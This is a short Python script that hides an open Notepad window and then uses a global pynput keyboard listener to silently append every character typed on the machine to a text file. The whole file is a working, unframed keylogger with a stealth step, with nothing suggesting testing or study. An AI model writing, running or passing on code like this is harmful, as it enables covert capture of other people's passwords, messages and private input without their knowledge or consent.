import pygetwindow as gw
import win32gui
import win32con
from pynput import keyboard

# Find the Notepad window
notepad_windows = gw.getWindowsWithTitle('Notepad')
if notepad_windows:
    notepad_window = notepad_windows[0]
else:
    print("No Notepad window found.")
    exit()

# Hide the Notepad window
hwnd = notepad_window._hWnd
win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

# Set the path to the Notepad file
notepad_file_path = r"C:\path\to\notepad_file.txt"

# Create a listener to capture keypress events
def on_press(key):
    try:
        with open(notepad_file_path, "a") as file:
            file.write(str(key.char))
    except AttributeError:
        pass

# Start the listener
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Wait for the listener to finish (you can modify or remove this part as needed)
listener.join()
